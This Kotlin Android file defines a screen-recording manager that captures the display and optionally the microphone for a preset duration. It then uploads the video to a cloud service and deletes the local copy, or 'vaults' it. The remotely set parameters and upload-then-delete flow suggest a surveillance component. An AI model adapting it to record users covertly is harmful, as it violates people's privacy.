package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import android.view.WindowManager
import kotlinx.coroutines.*
import java.io.File

object ScreenRecordManager {
    var expectedMode: String = ""
    var pendingDur: Int = 60
    var pendingQual: String = "MED"
    var pendingAudio: Boolean = false

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    var isRecording = false

    fun startRecording(ctx: Context, resultCode: Int, data: Intent) {
        if (isRecording) return
        isRecording = true
        
        CoroutineScope(Dispatchers.IO).launch {
            val outputFile = File(ctx.cacheDir, "vid_${System.currentTimeMillis()}.mp4")
            try {
                val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjection = mpm.getMediaProjection(resultCode, data)
                
                val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val metrics = DisplayMetrics()
                wm.defaultDisplay.getRealMetrics(metrics)
                
                var width = metrics.widthPixels
                var height = metrics.heightPixels
                var bitRate = 2500000
                
                when (pendingQual) {
                    "LOW" -> { width = 480; height = 854; bitRate = 1000000 }
                    "HIGH" -> { width = 1080; height = 1920; bitRate = 5000000 }
                    else -> { width = 720; height = 1280; bitRate = 2500000 }
                }
                
                mediaRecorder = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                    MediaRecorder(ctx)
                } else {
                    MediaRecorder()
                }
                
                mediaRecorder?.apply {
                    if (pendingAudio && PermissionManager.hasMic(ctx)) {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                    }
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setOutputFile(outputFile.absolutePath)
                    setVideoSize(width, height)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    if (pendingAudio && PermissionManager.hasMic(ctx)) {
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    }
                    setVideoEncodingBitRate(bitRate)
                    setVideoFrameRate(30)
                    prepare()
                }
                
                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "CortexScreenRecord",
                    width, height, metrics.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mediaRecorder?.surface, null, null
                )
                
                mediaRecorder?.start()
                DebugLogger.log("SCREEN_REC", "Recording active: ${pendingDur}s | Quality: $pendingQual | Audio: $pendingAudio")
                
                delay(pendingDur * 1000L)
                
            } catch (e: Exception) {
                DebugLogger.log("SCREEN_REC_ERR", "Capture failed: ${e.message}")
            } finally {
                stopRecording()
                if (outputFile.exists() && outputFile.length() > 0) {
                    if (CloudManager.uploadFile(ctx, outputFile, "SCREEN_RECORD")) {
                        outputFile.delete()
                    } else {
                        DumpManager.vaultMedia(outputFile, "SCREEN_RECORD")
                    }
                }
            }
        }
    }

    fun stopRecording() {
        try { mediaRecorder?.stop() } catch(e:Exception){}
        mediaRecorder?.reset()
        mediaRecorder?.release()
        mediaRecorder = null
        
        virtualDisplay?.release()
        virtualDisplay = null
        
        mediaProjection?.stop()
        mediaProjection = null
        
        isRecording = false
        DebugLogger.log("SCREEN_REC", "Hardware resources released.")
    }
}
